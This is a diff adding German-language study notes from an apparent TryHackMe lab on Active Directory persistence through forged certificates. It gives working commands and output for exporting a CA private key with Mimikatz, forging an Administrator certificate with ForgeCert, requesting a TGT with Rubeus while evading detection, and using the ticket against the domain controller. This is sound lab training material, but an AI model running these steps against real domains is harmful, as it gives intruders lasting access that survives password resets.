@@ -369,4 +369,247 @@ Parameters explained:
 ```
 
 
+# Persistence through Certificates
+
+***Diese Methode ist höchst invasiv. Das bedeutet, die Techniken hier sind nicht rückgängig zu machen und führen dazu, die Domain vollständig neu aufzubauen. Daher ist es nicht ratsam, diese Techniken in einem Red Team Einsatz zu nutzen. Vielmehr werden diese nur simuliert.***
+
+Die letzten beiden Techniken für Persistenz basierten auf Credentials. Wir können damit einem Blue Team zwar deutlich erschweren, letztendlich besteht aber immer die Möglichkeit durch Passwortrotation uns aus dem System zu werfen. Wie können wir dem entgegen wirken? Eine Möglichkeit sind Zertifikate.
+
+### The Return of AD CS
+
+Das Exploiten mithilfe von Zertifikaten haben wir ja schon im **Exploiting AD** Room kennengelernt, wo sie uns dabei geholfen haben, einen Domain Admin Zugang zu bekommen. Hier werden sie uns dabei helfen, einen dauerhaften Zugang zu erhalten. Alles was wir brauchen ist ein gültiges Zertifikat zur Client Authentifizierung. Das erlaubt uns, ein TGT beim KDC anzufragen. Egal wieviele Passwort Rotations das Blue Team macht, wir können TGT´s immer wieder anfragen. Die einzige Möglichkeit uns dieses zu verwehren wäre das Zertifikat zu blockieren. 
+
+Sollte Bedarf bestehen, können wir uns ja nochmal Den Exoloiting AD Room anschauen. Jetzt haben wir es aber erstmal auf den Certificate Authority (CA) abgesehen. 
+
+Abhängig von unserem Zugang können wir noch einen Schritt weiter gehen. Wir könnten ganz einfach vom root CA Zertifikat die privaten Schlüssel stehlen und unsere eigenen Zertifikate erstellen. Und das schlimme daran ist, dass das Blue Team diese Zertifikate nicht blocken kann, da sie nicht vom CA in Auftrag gegeben wurden. Man stelle sich vor man versucht die Domain wiederherzustellen, rotiert alle Passwörter, resettet alle Golden und Silver Tickets und erkennt dann, dass der Angreifer seinen Zugang dauerhaft eingerichtet hat, indem er die Certificate Authority geworden ist. 
+
+### Extracting the Private Key
+
+Okay wir fangen also mal mit dem CA an und versuchen den Private Key von diesem zu stehlen. 
+Der Private Key des CA befindet sich auf dem CA Server selbst. Wenn der Schlüssel nicht über eine hardware-basierte Preotection wie bspw. Hardware Security Modul (HSM) geschützt ist, was übrigends häufig der Fall ist in Unternehmen die einfach nur AD CS für interne Dinge nutzen, ist der Schlüssel über die Machine Data Protection API (DPAPI) gesichert. 
+Das bedeutet, wir wir können Tools wie Mimikatz oder SharpDPAPI nutzen um damit das CA zertifikat und somit den Private Key des CA zu extrahieren. 
+Am einfachsten geht es mit Mimikatz, aber falls man auch andere nutzen möchte, einfach mal [hier klicken](https://pentestlab.blog/2021/11/15/golden-certificate/)
+
+Wir loggen uns per SSH auf THMDC.za.tryhackme.loc mit unserem Admin Acc ein, erstellen nen eigenen Ordner und starten Mimikatz.
+
+Dann schauen wir uns mit foglendem Befehl an, welche zertifikate überhaupt auf dem Domain Controller gespeichert sind:
+
+>crypto::certificates /systemstore:local_machine
+
+Wir kriegen folgenden Output: 
+
+```bash
+mimikatz # crypto::certificates /systemstore:local_machine
+ * System Store  : 'local_machine' (0x00020000)
+ * Store         : 'My'
+
+ 0.
+    Subject  :
+    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
+    Serial   : 040000000000703a4d78090a0ab10400000010
+    Algorithm: 1.2.840.113549.1.1.1 (RSA)
+    Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
+    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
+        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
+        Provider       : Microsoft RSA SChannel Cryptographic Provider
+        Provider type  : RSA_SCHANNEL (12)
+        Type           : AT_KEYEXCHANGE (0x00000001)
+        |Provider name : Microsoft RSA SChannel Cryptographic Provider
+        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
+        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
+        |Implementation: CRYPT_IMPL_SOFTWARE ;
+        Algorithm      : CALG_RSA_KEYX
+        Key size       : 2048 (0x00000800)
+        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
+        Exportable key : NO
+[....]
+```
+In diesem Fall sind 4 zertifikate auf dem DC gespeichert, allerdings lassen sich aus diesen der Key wohl nicht exportieren. Zum Glücl lässt uns Mimikatz den Speicher patchen, sodass wir die die Schlüssel exportieren können:
+
+```bash
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # crypto::capi
+Local CryptoAPI RSA CSP patched
+Local CryptoAPI DSS CSP patched
+
+mimikatz # crypto::cng
+"KeyIso" service patched
+```
+
+Die exportierten Zertifikate befinden sich jetzt als *.pfx und *.der Format auf der Platte:
+
+```bash
+za\administrator@THMDC C:\Users\Administrator.ZA\am0>dir
+ Volume in drive C is Windows
+ Volume Serial Number is 1634-22A9
+
+ Directory of C:\Tools\x64
+
+05/10/2022  12:12 PM    <DIR>          .
+05/10/2022  12:12 PM    <DIR>          ..
+05/10/2022  12:12 PM             1,423 local_machine_My_0_.der
+05/10/2022  12:12 PM             3,299 local_machine_My_0_.pfx
+05/10/2022  12:12 PM               939 local_machine_My_1_za-THMDC-CA.der
+05/10/2022  12:12 PM             2,685 local_machine_My_1_za-THMDC-CA.pfx
+05/10/2022  12:12 PM             1,534 local_machine_My_2_THMDC.za.tryhackme.loc.der
+05/10/2022  12:12 PM             3,380 local_machine_My_2_THMDC.za.tryhackme.loc.pfx
+05/10/2022  12:12 PM             1,465 local_machine_My_3_.der
+05/10/2022  12:12 PM             3,321 local_machine_My_3_.pfx 
+```
+
+Für uns extren interessant ist das "za-THMDC-CA.pfx" zertifikat. Um den Private Key zu exportieren muss ein Passwort zu Verschlüsselung des Zertifikates gesetzt werden. Standardmäßig setzt Mimikatz hier ***mimikatz*** also Passwort.
+Wir laden das Zertifikate herunter und laden es auf THMWRK1 ins Verzeichnis unserer "Low-Priv" Users hoch.
+
+Recap Download via SCP:
+>scp username@remote_host:/path/to/downloadme.exe /local/path/to/save
+
+
+Recap Upload via SCP:
+>scp /local/path/to/uploadme.exe username@remote_host:/remote/path/to/save
+
+
+### Generating our own Certificates
+
+Wir haben also den Private Key und das root CA Zertifikat. Wir können mit dem [ForgeCert](https://github.com/GhostPack/ForgeCert) Tool nun ein Client Authenticate Certificate erstellen:
+
+```bash
+za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
+```
+
+```
+Parameters Explained:
+CaCertPath - The path to our exported CA certificate.
+
+CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
+
+Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
+
+SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
+
+NewCertPath - The path to where ForgeCert will store the generated certificate.
+
+NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.
+```
+
+Super, wir können jetzt mit Rubeus ein TGT anfragen und dabei unser frisches Zertifiakt testen:
+
+```bash
+C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
+```
+```
+Let's break down the parameters:
+
+/user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
+/enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
+/certificate - Path to the certificate we have generated
+/password - The password for our certificate file
+/outfile - The file where our TGT will be output to
+/domain - The FQDN of the domain we are currently attacking
+/dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running
+```
+
+Output: 
+
+```bash
+za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
+          ______        _
+         (_____ \      | |
+          _____) )_   _| |__  _____ _   _  ___
+         |  __  /| | | |  _ \| ___ | | | |/___)
+         | |  \ \| |_| | |_) ) ____| |_| |___ |
+         |_|   |_|____/|____/|_____)____/(___/
+       
+         v2.0.0
+       
+       [*] Action: Ask TGT
+       
+       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
+       [*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\Administrator'
+       [+] TGT request successful!
+       [*] base64(ticket.kirbi):
+       
+             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
+       
+         ServiceName              :  krbtgt/za.tryhackme.loc
+         ServiceRealm             :  za.tryhackme.loc
+         UserName                 :  Administrator
+         UserRealm                :  za.tryhackme.loc
+         StartTime                :  2/6/2022 5:54:46 PM
+         EndTime                  :  2/7/2022 3:54:46 AM
+         RenewTill                :  2/13/2022 5:54:46 PM
+         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+         KeyType                  :  aes256_cts_hmac_sha1
+         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
+         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
+```
+
+Wir haben also das TGT. Dieses müssen wir jetzt mit Mimikatz in unseren Speicher laden:
+
+```bash
+za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\mimikatz_trunk\x64\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # kerberos::ptt administrator.kirbi
+
+* File: 'administrator.kirbi': OK
+
+mimikatz # exit
+Bye! 
+
+za\aaron.jones@THMWRK1 C:\Users\aaron.jones>dir \\THMDC.za.tryhackme.loc\c$\
+ Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows
+ Volume Serial Number is 1634-22A9
+
+ Directory of \\THMDC.za.tryhackme.loc\c$
+
+01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
+04/30/2022  10:24 AM               154 dns_entries.csv
+04/27/2022  10:53 PM           885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
+09/15/2018  08:19 AM    <DIR>          PerfLogs
+03/21/2020  09:31 PM    <DIR>          Program Files
+03/21/2020  09:28 PM    <DIR>          Program Files (x86)
+04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1
+04/25/2022  07:13 PM    <DIR>          tmp
+04/27/2022  08:22 AM    <DIR>          Users
+04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
+04/27/2022  08:12 PM    <DIR>          Windows
+               7 File(s)      2,356,811 bytes
+               7 Dir(s)  50,914,541,568 bytes free
+```
+
+Wir haben also jetzt dauerhaften Zugang mit Hilfe eines Zertifikats.
+
 
